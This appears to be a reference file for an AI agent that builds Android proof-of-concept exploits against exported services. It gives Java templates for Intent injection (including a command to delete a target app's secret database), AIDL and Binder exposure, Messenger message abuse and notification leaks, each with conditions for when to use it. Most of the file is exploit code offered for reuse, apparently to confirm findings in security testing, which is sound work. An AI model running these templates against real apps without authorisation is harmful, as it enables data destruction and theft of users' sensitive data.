---
name: poc-app-service
description: Service PoC reference covering AIDL exposure, Messenger abuse, Intent injection, bind escalation, and foreground-notification leakage.
---

# Service PoC Reference

Use this reference for exported or otherwise attacker-reachable Android services. Service PoCs usually fit either `direct-trigger` or `binder-caller` mode.

## Construction Matrix

| Vulnerability | Exploit mode | Typical support | Visible success |
|---------------|--------------|-----------------|-----------------|
| AIDL exposure | `binder-caller` | recreated Stub/interface | sensitive method returns data or accepts privileged action |
| Messenger abuse | `binder-caller` | none | target handler accepts attacker message |
| Intent injection | `direct-trigger` | none | service performs attacker-requested action |
| Bind escalation | `binder-caller` | recreated Binder wrapper if needed | privileged Binder method succeeds |
| Foreground leak | `ui-assisted` | optional notification listener | sensitive notification text is visible or captured |

## Shared Inputs

Collect these fields before coding:

- victim service class
- exported or bindable status
- required action, extras, or message codes
- Binder interface name, Stub class, or `what`/`arg1`/`obj` protocol
- visible success signal

## Pattern 1 - Start-Service Trigger

Use for `ServiceIntentInjectExploit`.

```java
public final class ServiceIntentInjectExploit extends Exploit {
    public ServiceIntentInjectExploit(Context context) {
        super(context);
    }

    @Override
    public void execute() {
        Intent intent = new Intent();
        intent.setClassName("com.target", "com.target.CommandService");
        intent.setAction("com.target.EXECUTE_COMMAND");
        intent.putExtra("command", "delete");
        intent.putExtra("target_path", "/data/data/com.target/databases/secret.db");
        context.startService(intent);
        log("Sent startService() trigger to com.target.CommandService");
    }
}
```

Use when:

- the service reads attacker-controlled extras or action strings from `onStartCommand()`
- no non-bypassable permission check blocks the launch

Do not use when:

- the service path only exists behind a Binder interface

## Pattern 2 - Direct Bind with Binder Handle

Use for `ServiceAidlExposeExploit` or `ServiceBindEscalationExploit`.

```java
public final class ServiceAidlExposeExploit extends Exploit {
    public ServiceAidlExposeExploit(Context context) {
        super(context);
    }

    @Override
    public void execute() {
        Intent intent = new Intent();
        intent.setClassName("com.target", "com.target.VulnService");
        context.bindService(intent, connection, Context.BIND_AUTO_CREATE);
    }

    private final ServiceConnection connection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder binder) {
            log("Bound to com.target.VulnService");
            // Replace with the real reconstructed interface:
            // ITargetService service = ITargetService.Stub.asInterface(binder);
            // String data = service.getSensitiveData();
            // log("Leaked data: " + data);
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {}
    };
}
```

Use when:

- the exported service returns a Binder to external callers
- the vuln report already identified a reachable privileged Binder method

Manifest support:

- usually none
- only recreate `.aidl` or Binder wrapper classes if the compile path requires them

Success signal:

- returned protected data
- accepted privileged operation

## Pattern 3 - Messenger Protocol Caller

Use for `ServiceMessengerAbuseExploit`.

```java
public final class ServiceMessengerAbuseExploit extends Exploit {
    public ServiceMessengerAbuseExploit(Context context) {
        super(context);
    }

    @Override
    public void execute() {
        Intent intent = new Intent();
        intent.setClassName("com.target", "com.target.MsgService");
        context.bindService(intent, connection, Context.BIND_AUTO_CREATE);
    }

    private final ServiceConnection connection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder binder) {
            try {
                Messenger messenger = new Messenger(binder);
                Message msg = Message.obtain();
                msg.what = 1;
                msg.obj = "malicious_command";
                messenger.send(msg);
                log("Sent attacker message to Messenger service");
            } catch (Exception e) {
                log("Messenger send failed: " + e.getMessage());
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {}
    };
}
```

Use when:

- the service exposes a `Messenger`
- the message protocol is attacker-controlled and weakly validated

Fill with:

- real `what`, `arg1`, `arg2`, `Bundle`, `replyTo`, or `obj` values from the verified finding

## Pattern 4 - Foreground-Notification Observation

Use for `ServiceForegroundLeakExploit`.

```java
public final class ServiceForegroundLeakExploit extends Exploit {
    public ServiceForegroundLeakExploit(Context context) {
        super(context);
    }

    @Override
    public void execute() {
        Intent intent = new Intent();
        intent.setClassName("com.target", "com.target.LeakyForegroundService");
        context.startService(intent);
        log("Started foreground service. Check whether the notification exposes tokens, account data, or other sensitive text.");
    }
}
```

Use when:

- the finding is about sensitive notification content rather than a Binder or Intent control path

Optional support:

- add a `NotificationListenerService` only if the user wants runtime collection instead of manual confirmation

## Construction Notes

- Prefer `direct-trigger` if `startService()` alone demonstrates the bug
- Prefer `binder-caller` if the real vulnerable path lives behind `onBind()`
- Do not fake privileged Binder calls if the report never identified a reachable method
- For AIDL or Binder cases, keep the exploit focused on one verified method, not the entire interface
- For foreground leaks, the success signal is the visible notification content, not a theoretical background leak
